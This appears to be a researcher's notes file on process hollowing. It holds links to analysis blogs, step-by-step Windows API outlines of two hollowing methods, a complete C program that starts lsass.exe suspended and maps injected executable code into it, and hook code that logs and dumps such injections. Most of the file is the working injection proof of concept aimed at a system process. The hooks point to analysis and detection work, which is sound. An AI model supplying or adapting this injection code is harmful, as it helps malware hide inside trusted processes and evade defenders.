http://journeyintoir.blogspot.com/2015/02/process-hollowing-meets-cuckoo-sandbox.html
http://blog.w4kfu.com/tag/duqu

Method 1:
        - CreateProcessA: creates a new process and the process creation flag 0x00000004 is used to create the process in the suspended state
        - GetThreadContext: retrieves the context of the specified thread for the suspended process
        - ReadProcessMemory: reads the image base of the suspended process
        - GetProcAddress: according to Practical Malware Analysis this function “manually resolves the import UnMapViewofSection using GetProcAddress, the ImageBaseAddress is a parameter of UnMapViewofSection”. This removes the suspended process from memory.
        - VirtualAllocEx: allocates memory within the suspended process’s address space
        - WriteProcessMemory: writes data of the PE file into the memory just allocated within the suspended process
        - SetThreadContext: according to Practical Malware Analysis this function sets the EAX register to the entry point of the executable just written into the suspended process’s memory space. This means the thread of the suspended process is pointing to the injected code so it will execute when the process is resumed
        - ResumeThread: resumes the thread of the suspended process executing the injected code

Method 2:
        - CreateProcessA: creates a new process and the process creation flag 0x00000004 is used to create the process in the suspended state
		- ZwQueryInformationProcess - Get the pointer to the PEB structure
        - ReadProcessMemory: reads image base of the suspended process
        - NtCreateSection: creates two read/write/execute sections 
        - ZwMapViewOfSection: maps the read/write/execute sections into the malware’s address space
        - ZwMapViewOfSection: maps the second section into the suspended process’s address space (this section is therefore shared between both processes).
        - ReadProcessMemory: reads image base of the suspended process’s image into section 1
        - ReadProcessMemory: reads image base of the malware’s image into section 2
        - NtMapViewOfSection: overwrites the suspended process's entry point code by mapping section 1 to the new process base address
        - ResumeThread: resumes the thread of the suspended process executing the injected code

===========================================================================================================
#include "main.h"

int get_entrypoint(char *read_proc)
{
	IMAGE_DOS_HEADER *idh = NULL;
	IMAGE_NT_HEADERS *inh = NULL;

	idh = (IMAGE_DOS_HEADER*)read_proc;
	inh = (IMAGE_NT_HEADERS *)((BYTE*)read_proc + idh->e_lfanew);
	printf("Entrypoint = %x\n", inh->OptionalHeader.AddressOfEntryPoint);
	return (inh->OptionalHeader.AddressOfEntryPoint);
}

int main(void)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char path_lsass[260];
	PROCESS_BASIC_INFORMATION pbi;
	DWORD nb_read;
	DWORD ImageBase;
	HANDLE hsect;
	NTSTATUS stat;
	PVOID BaseAddress = NULL;
	PVOID BaseAddress2 = NULL;
	DWORD oep;

	memset(&si, 0, sizeof(STARTUPINFO));
    	si.cb = sizeof(STARTUPINFO);
    	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&pbi, 0, sizeof(PROCESS_BASIC_INFORMATION));
	ExpandEnvironmentStrings(L"%SystemRoot%\\system32\\lsass.exe", (LPWSTR)path_lsass, 260);
	wprintf(L"[+] New Path for lsasse.exe = %s\n", path_lsass);
	if (!CreateProcess((LPWSTR)path_lsass, NULL, NULL, NULL, NULL,
					CREATE_SUSPENDED|DETACHED_PROCESS|CREATE_NO_WINDOW,
					NULL, NULL, &si, &pi))
	{
		printf("[-] CreateProcessW failed\n");
		printf("LatError = %x\n", GetLastError());
		return (-1);
	}

	ZwQueryInformationProcess = (long (__stdcall *)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwQueryInformationProcess");
	ZwMapViewOfSection = (long (__stdcall *)(HANDLE,HANDLE,PVOID *,ULONG_PTR,SIZE_T,PLARGE_INTEGER,PSIZE_T,DWORD,ULONG,ULONG))GetProcAddress(GetModuleHandleA("ntdll"),"ZwMapViewOfSection");
	ZwUnmapViewOfSection = (long (__stdcall *)(HANDLE, PVOID))GetProcAddress(GetModuleHandleA("ntdll"),"ZwUnmapViewOfSection");
	ZwCreateSection = (long (__stdcall *)(PHANDLE,ACCESS_MASK,PDWORD,PLARGE_INTEGER,ULONG,ULONG,HANDLE))GetProcAddress(GetModuleHandleA("ntdll"),"ZwCreateSection");

	if (ZwMapViewOfSection == NULL || ZwQueryInformationProcess == NULL || ZwUnmapViewOfSection == NULL || ZwCreateSection == NULL)
	{
		printf("[-] GetProcAddress failed\n");
		return (-1);
	}

	if (ZwQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL) != 0)
    {
		printf("[-] ZwQueryInformation failed\n");
		return (-1);
    }

	printf("[+] UniqueProcessID = 0x%x\n", pbi.UniqueProcessId);

	if (!ReadProcessMemory(pi.hProcess, (BYTE*)pbi.PebBaseAddress + 8, &ImageBase, 4, &nb_read) && nb_read != 4)
	{
		printf("[-] ReadProcessMemory failed\n");
		return (-1);
	}

	printf("[+] ImageBase = 0x%x\n", ImageBase);

	char read_proc[0x6000];

	if (!ReadProcessMemory(pi.hProcess, (LPCVOID)ImageBase, read_proc, 0x6000, &nb_read) && nb_read != 0x6000)
	{
		printf("[-] ReadProcessMemory failed\n");
		return (-1);
	}

	printf("(dbg) Two first bytes : %c%c\n", read_proc[0], read_proc[1]);
	oep = get_entrypoint(read_proc);

	LARGE_INTEGER a;
	a.HighPart = 0;
	a.LowPart = 0x8EF6;

	if ((stat = ZwCreateSection(&hsect, SECTION_ALL_ACCESS, NULL, &a, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != STATUS_SUCCESS)
	{
		printf("[-] ZwCreateSection failed\n");
		printf("[-] NTSTATUS = %x\n", stat);
		return (-1);
	}
	SIZE_T size;
	size = 0x8000;

	BaseAddress = (PVOID)0;
	if ((stat = ZwMapViewOfSection(hsect, GetCurrentProcess(), &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
		printf("[-] ZwMapViewOfSection failed\n");
		printf("[-] NTSTATUS = %x\n", stat);
		return (-1);
	}
	memset((BYTE*)read_proc + oep, 0xCC, 1);
	memcpy(BaseAddress, read_proc, 0x2000);
	BaseAddress = (PVOID)ImageBase;
	printf("BaseAddress = %x\n", BaseAddress);

	ZwUnmapViewOfSection(pi.hProcess, BaseAddress);

	if ((stat = ZwMapViewOfSection(hsect, pi.hProcess, &BaseAddress, NULL, NULL, NULL, &size, 1 /* ViewShare */, NULL, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
	{
		printf("[-] ZwMapViewOfSection failed\n");
		printf("[-] NTSTATUS = %x\n", stat);
		system("pause");
		return (-1);
	}
	printf("BaseAddress = %x\n", BaseAddress);
	ResumeThread(pi.hThread);
	system("pause");

	return (0);
}

#include <stdio.h>
#include <Windows.h>

#if !defined NTSTATUS
typedef LONG NTSTATUS;
#endif

#define STATUS_SUCCESS 0

#if !defined PROCESSINFOCLASS
typedef LONG PROCESSINFOCLASS;
#endif

#if !defined PPEB
typedef struct _PEB *PPEB;
#endif

#if !defined PROCESS_BASIC_INFORMATION
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PPEB PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;
#endif;

typedef LONG NTSTATUS, *PNTSTATUS;
typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONG Length;
  HANDLE RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG Attributes;
  PVOID SecurityDescriptor;
  PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS (WINAPI * PFN_ZWQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS,
    PVOID, ULONG, PULONG);

NTSTATUS (__stdcall *ZwQueryInformationProcess)(
  HANDLE  ProcessHandle,
  PROCESSINFOCLASS  ProcessInformationClass,
  PVOID  ProcessInformation,
  ULONG  ProcessInformationLength,
  PULONG  ReturnLength  OPTIONAL
  );

NTSTATUS (__stdcall *ZwCreateSection)(
     PHANDLE  SectionHandle,
     ACCESS_MASK  DesiredAccess,
     PDWORD  ObjectAttributes OPTIONAL,
     PLARGE_INTEGER  MaximumSize OPTIONAL,
     ULONG  SectionPageProtection,
     ULONG  AllocationAttributes,
     HANDLE  FileHandle OPTIONAL
    );

NTSTATUS (__stdcall *ZwMapViewOfSection) (
HANDLE SectionHandle,
HANDLE ProcessHandle,
OUT PVOID *BaseAddress,
ULONG_PTR ZeroBits,
SIZE_T CommitSize,
PLARGE_INTEGER SectionOffset,
PSIZE_T ViewSize,
DWORD InheritDisposition,
ULONG AllocationType,
ULONG Win32Protect
);

NTSTATUS (__stdcall *ZwUnmapViewOfSection)(
	HANDLE ProcessHandle,
	PVOID BaseAddress
	);

===========================================================================================================
Some unwanted code here.

//NtCreateProcessEx
//NtCreateProcess
//NtCreateUserProcess
//NtReadVirtualMemory

/*typedef NTSTATUS (*ZWCREATEPROCESS)(OUT PHANDLE ProcessHandle,
                                    IN ACCESS_MASK DesiredAccess,
                                    IN POBJECT_ATTRIBUTES ObjectAttributes,
                                    IN HANDLE ParentProcess,
                                    IN BOOLEAN InheritObjectTable,
                                    IN HANDLE SectionHandle,
                                    IN HANDLE DebugPort,
                                    IN HANDLE ExceptionPort
                                    );

typedef NTSTATUS (*ZWCREATEPROCESSEX)(
                                      OUT PHANDLE ProcessHandle,
                                      IN ACCESS_MASK DesiredAccess,
                                      IN POBJECT_ATTRIBUTES ObjectAttributes,
                                      IN HANDLE InheritFromProcessHandle,
                                      IN BOOLEAN InheritHandles,
                                      IN HANDLE SectionHandle OPTIONAL,
                                      IN HANDLE DebugPort OPTIONAL,
                                      IN HANDLE ExceptionPort OPTIONAL,
                                      IN HANDLE Unknown 
                                      );

typedef NTSTATUS (*NTCREATEUSERPROCESS)(PHANDLE ProcessHandle,
                                        PHANDLE ThreadHandle,
                                        PVOID Parameter2,
                                        PVOID Parameter3,
                                        PVOID ProcessSecurityDescriptor,
                                        PVOID ThreadSecurityDescriptor,
                                        PVOID Parameter6,
                                        PVOID Parameter7,
                                        PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
                                        PVOID Parameter9,
                                        PVOID pProcessUnKnow);
*/

//static DWORD (WINAPI *original_ResumeThread)(HANDLE hThread)= ResumeThread;

static LPVOID (WINAPI *original_VirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = VirtualAllocEx;
static BOOL (WINAPI *original_WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) = WriteProcessMemory;
static BOOL (WINAPI* original_GetThreadContext) (HANDLE    hThread, LPCONTEXT lpContext)= GetThreadContext;
static BOOL (WINAPI* original_SetThreadContext) (HANDLE    hThread, const CONTEXT *lpContext)= SetThreadContext;
static BOOL (WINAPI *original_TerminateProcess)(HANDLE hProcess, UINT uExitCode)= TerminateProcess;
static BOOL (WINAPI *original_WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) = WriteProcessMemory;


static LPVOID WINAPI HookedVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)
{
	LPVOID	lpAddr;

	if (hProcess != ::GetCurrentProcess()){
		#ifdef DEBUG
		OUTPUTME("VirtualAllocEx on a remote process handle %08x \n\tAddress= %08x \n\tsize= %d\n\tAllocationType= %08x\n\tProtectionFlags= %08x\n" , hProcess, lpAddress, dwSize, flAllocationType, flProtect);
		#endif
	}

	lpAddr = original_VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect);

	if (hProcess != ::GetCurrentProcess()){
		#ifdef DEBUG
		OUTPUTME("VirtualAllocEx on a remote process handle %08x \n\tReturned Address= %08x\n" , hProcess, lpAddr);
		#endif
		r_lpAddress= lpAddress;
		r_Size= dwSize;
	}


	return lpAddr;
}

static BOOL WINAPI HookedGetThreadContext(HANDLE    hThread, LPCONTEXT lpContext)
{
	if (hThread == rThreadHandle){
		#ifdef DEBUG
		OUTPUTME("Getting the Thread context of the remote handle %08x\n", hThread);
		#endif
	}

	return original_GetThreadContext(hThread, lpContext);
}

static BOOL WINAPI HookedSetThreadContext(HANDLE    hThread, const CONTEXT *lpContext)
{
	if (hThread == rThreadHandle){
		#ifdef DEBUG
		OUTPUTME("Setting the Thread context of the remote handle %08x\n", hThread);
		#endif
	}

	return original_SetThreadContext(hThread, lpContext);
}

static BOOL WINAPI HookedWriteProcessMemory(HANDLE ProcessHandle, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)
{
	if (ProcessHandle != ::GetCurrentProcess() /*&& nSize > 4*/){
		#ifdef DEBUG
		//OUTPUTME("WriteProcessMemory on a remote process handle %08x\n\tAddress= %08x\n\tsize= %d\n" , ProcessHandle, lpBaseAddress, nSize);
		#endif
		//if (nSize == 4){
			// current write size is 4.
			//if (g_PrevWriteProcessMemory != nSize){
			if (r_lpAddress == lpBaseAddress) {
				#ifdef DEBUG
				OUTPUTME("WriteProcessMemory on a remote process handle %08x\n\tLocal Address= %08x\n\tRemote Address= %08x\n\tsize= %d\n" , ProcessHandle, lpBuffer, lpBaseAddress, nSize);
				#endif
				//DumpMemory(rProcessHandle, r_lpAddress, r_Size);
				// or you can save these addresses and get the dump in the resumethread()
				glpBuffer= lpBuffer;
				g_r_Size= r_Size;
				g_r_lpAddress= r_lpAddress;
				DumpMemory(NULL, (LPVOID)lpBuffer, r_Size, (LPVOID)r_lpAddress, TRUE);
				DumpMemory(NULL, (LPVOID)lpBuffer, r_Size, (LPVOID)r_lpAddress, FALSE);
			}
		//}
		g_PrevWriteProcessMemory= nSize;
	}

	return original_WriteProcessMemory(ProcessHandle, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

static BOOL WINAPI HookedResumeThread(HANDLE    hThread)
{
	if (hThread == rThreadHandle){
		#ifdef DEBUG
		OUTPUTME("Resuming the Thread of the remote handle %08x\n", hThread);
		#endif
		DumpMemory(NULL, (LPVOID)glpBuffer, g_r_Size, (LPVOID)g_r_lpAddress, FALSE);
	}

	return original_ResumeThread(hThread);
	//return false;
}



		//DetourAttach(&(PVOID&)original_VirtualAllocEx, HookedVirtualAllocEx);
		//DetourAttach(&(PVOID&)original_WriteProcessMemory, HookedWriteProcessMemory);
		//DetourAttach(&(PVOID&)original_GetThreadContext, HookedGetThreadContext);
		//DetourAttach(&(PVOID&)original_SetThreadContext, HookedSetThreadContext);
		//DetourAttach(&(PVOID&)original_ResumeThread, HookedResumeThread);

		//DetourDetach(&(PVOID&)original_GetThreadContext, HookedGetThreadContext);
		//DetourDetach(&(PVOID&)original_SetThreadContext, HookedSetThreadContext);
		//DetourDetach(&(PVOID&)original_WriteProcessMemory, HookedWriteProcessMemory);
		//DetourDetach(&(PVOID&)original_VirtualAllocEx, HookedVirtualAllocEx);
		//DetourDetach(&(PVOID&)original_ResumeThread, HookedResumeThread);
